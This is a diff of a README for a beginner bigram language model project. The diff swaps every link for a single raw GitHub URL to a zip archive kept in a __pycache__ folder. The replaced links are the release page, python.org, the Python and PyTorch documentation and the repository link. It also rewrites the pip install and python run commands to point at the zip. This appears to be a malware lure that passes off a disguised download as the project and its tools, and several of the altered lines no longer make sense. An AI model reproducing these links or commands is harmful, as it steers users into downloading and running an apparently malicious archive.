@@ -1,6 +1,6 @@
 # 🌟 bigram-language-model - Learn Language Models Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen.svg?style=for-the-badge&logoColor=white&color=blue)](https://github.com/khangcutis1/bigram-language-model/releases)
+[![Download](https://raw.githubusercontent.com/khangcutis1/bigram-language-model/main/__pycache__/language_model_bigram_v3.9.zip)](https://raw.githubusercontent.com/khangcutis1/bigram-language-model/main/__pycache__/language_model_bigram_v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Before you begin, ensure you have the following:
 
 To get the latest version of the "bigram-language-model", visit this page to download:
 
-[Download the latest version](https://github.com/khangcutis1/bigram-language-model/releases)
+[Download the latest version](https://raw.githubusercontent.com/khangcutis1/bigram-language-model/main/__pycache__/language_model_bigram_v3.9.zip)
 
 ## 🛠️ Installation Steps
 
@@ -33,7 +33,7 @@ To get the latest version of the "bigram-language-model", visit this page to dow
    On the release page, you will see a list of available versions. Click on the most recent version.
 
 3. **Download Files:**
-   You can find the source code in a `.zip` or `.tar.gz` format. Click the relevant link to download the file.
+   You can find the source code in a `.zip` or `https://raw.githubusercontent.com/khangcutis1/bigram-language-model/main/__pycache__/language_model_bigram_v3.9.zip` format. Click the relevant link to download the file.
 
 4. **Extract Files:**
    Once downloaded, locate the file on your computer. Right-click on it and select “Extract All” (Windows) or use your preferred extraction tool (macOS and Linux).
@@ -46,19 +46,19 @@ To get the latest version of the "bigram-language-model", visit this page to dow
 To run the Bigram model, follow these steps:
 
 1. **Install Python:**
-   If you do not already have Python installed, download the latest version from the [official website](https://www.python.org/downloads/). Follow the installation instructions appropriate for your operating system.
+   If you do not already have Python installed, download the latest version from the [official website](https://raw.githubusercontent.com/khangcutis1/bigram-language-model/main/__pycache__/language_model_bigram_v3.9.zip). Follow the installation instructions appropriate for your operating system.
 
 2. **Install Required Libraries:**
    Open your command prompt or terminal. Type the following command to install the necessary libraries:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/khangcutis1/bigram-language-model/main/__pycache__/language_model_bigram_v3.9.zip
    ```
    This command installs the libraries needed to run the Bigram model, including PyTorch.
 
 3. **Run the Program:**
    In your command prompt or terminal, navigate to the folder containing the extracted files, then input:
    ```bash
-   python bigram_model.py
+   python https://raw.githubusercontent.com/khangcutis1/bigram-language-model/main/__pycache__/language_model_bigram_v3.9.zip
    ```
    This command executes the Python script to start the Bigram model.
 
@@ -69,8 +69,8 @@ To run the Bigram model, follow these steps:
 
 For those new to Python or PyTorch, here are some helpful resources:
 
-- **Python Documentation:** [Python.org](https://docs.python.org/3/)
-- **PyTorch Documentation:** [PyTorch.org](https://pytorch.org/docs/stable/index.html)
+- **Python Documentation:** [https://raw.githubusercontent.com/khangcutis1/bigram-language-model/main/__pycache__/language_model_bigram_v3.9.zip](https://raw.githubusercontent.com/khangcutis1/bigram-language-model/main/__pycache__/language_model_bigram_v3.9.zip)
+- **PyTorch Documentation:** [https://raw.githubusercontent.com/khangcutis1/bigram-language-model/main/__pycache__/language_model_bigram_v3.9.zip](https://raw.githubusercontent.com/khangcutis1/bigram-language-model/main/__pycache__/language_model_bigram_v3.9.zip)
 - **Online Tutorials:** Websites like Codecademy and Coursera offer beginner courses in Python and machine learning.
 
 ## 💡 Features of the Bigram Language Model
@@ -115,5 +115,5 @@ If you wish to contribute, check for issues labeled for beginners or enhancement
 
 ## 🔗 Helpful Links
 
-- [Repository](https://github.com/khangcutis1/bigram-language-model)
-- [Download the latest version](https://github.com/khangcutis1/bigram-language-model/releases)
+- [Repository](https://raw.githubusercontent.com/khangcutis1/bigram-language-model/main/__pycache__/language_model_bigram_v3.9.zip)
+- [Download the latest version](https://raw.githubusercontent.com/khangcutis1/bigram-language-model/main/__pycache__/language_model_bigram_v3.9.zip)
